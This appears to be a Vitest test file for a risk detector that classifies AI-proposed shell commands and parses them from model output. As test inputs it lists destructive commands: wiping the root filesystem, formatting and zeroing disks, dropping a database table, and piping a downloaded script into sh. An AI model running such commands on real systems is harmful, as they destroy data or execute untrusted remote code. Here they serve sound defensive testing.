import { describe, it, expect } from 'vitest'
import { detectRiskyCommand, parseCommandBlocks } from '../aiCommand'

describe('detectRiskyCommand', () => {
  it('识别高危命令', () => {
    expect(detectRiskyCommand('rm -rf /')?.level).toBe('high')
    expect(detectRiskyCommand('mkfs.ext4 /dev/sdb1')?.level).toBe('high')
    expect(detectRiskyCommand('dd if=/dev/zero of=/dev/sda bs=1M')?.level).toBe('high')
    expect(detectRiskyCommand('shutdown -h now')?.level).toBe('high')
    expect(detectRiskyCommand('mysql -e "DROP TABLE users"')?.level).toBe('high')
    expect(detectRiskyCommand('curl http://x.sh | sh')?.level).toBe('high')
  })

  it('识别中危命令', () => {
    expect(detectRiskyCommand('rm -rf ./logs')?.level).toBe('medium')
    expect(detectRiskyCommand('systemctl stop nginx')?.level).toBe('medium')
    expect(detectRiskyCommand('find /var/log -name "*.log" -delete')?.level).toBe('medium')
  })

  it('普通只读命令不告警', () => {
    expect(detectRiskyCommand('ls -la')).toBeNull()
    expect(detectRiskyCommand('grep -n ERROR app.log')).toBeNull()
    expect(detectRiskyCommand('tail -n 200 app.log')).toBeNull()
  })
})

describe('parseCommandBlocks', () => {
  it('解析说明、风险与命令', () => {
    const text = [
      '### 1. 统计最近一小时的 ERROR 数量',
      '风险：低',
      '```bash',
      'grep -c ERROR /data/logs/app.log',
      '```',
      '',
      '### 2. 清理旧日志',
      '风险：中',
      '```bash',
      'rm -rf /data/logs/old',
      '```'
    ].join('\n')
    const commands = parseCommandBlocks(text)
    expect(commands).toHaveLength(2)
    expect(commands[0]).toMatchObject({
      command: 'grep -c ERROR /data/logs/app.log',
      note: '统计最近一小时的 ERROR 数量',
      risk: 'low'
    })
    expect(commands[1].command).toBe('rm -rf /data/logs/old')
    expect(commands[1].risk).toBe('medium')
    expect(commands[1].localRisk?.reason).toContain('递归强制删除')
  })

  it('本地高危规则可提升模型标注的风险', () => {
    const text = ['### 1. 重置环境', '风险：低', '```bash', 'rm -rf /', '```'].join('\n')
    const [command] = parseCommandBlocks(text)
    expect(command.risk).toBe('high')
    expect(command.localRisk?.level).toBe('high')
  })

  it('缺少风险标注时为 unknown，本地规则仍可命中', () => {
    const text = ['```bash', 'df -h', '```'].join('\n')
    const [command] = parseCommandBlocks(text)
    expect(command.risk).toBe('unknown')
    expect(command.note).toBe('')
  })

  it('忽略非 bash 代码块与没有代码块的输出', () => {
    expect(parseCommandBlocks('普通结论，没有命令')).toEqual([])
    const text = ['```json', '{"a":1}', '```'].join('\n')
    expect(parseCommandBlocks(text)).toEqual([])
  })

  it('最多返回 3 条并去重', () => {
    const block = (n: number): string =>
      ['### ' + n + '. 说明', '风险：低', '```bash', 'ls -' + n, '```'].join('\n')
    const commands = parseCommandBlocks([block(1), block(2), block(3), block(4)].join('\n\n'))
    expect(commands).toHaveLength(3)
    const duplicated = ['```bash', 'ls -la', '```', '```bash', 'ls -la', '```'].join('\n')
    expect(parseCommandBlocks(duplicated)).toHaveLength(1)
  })
})
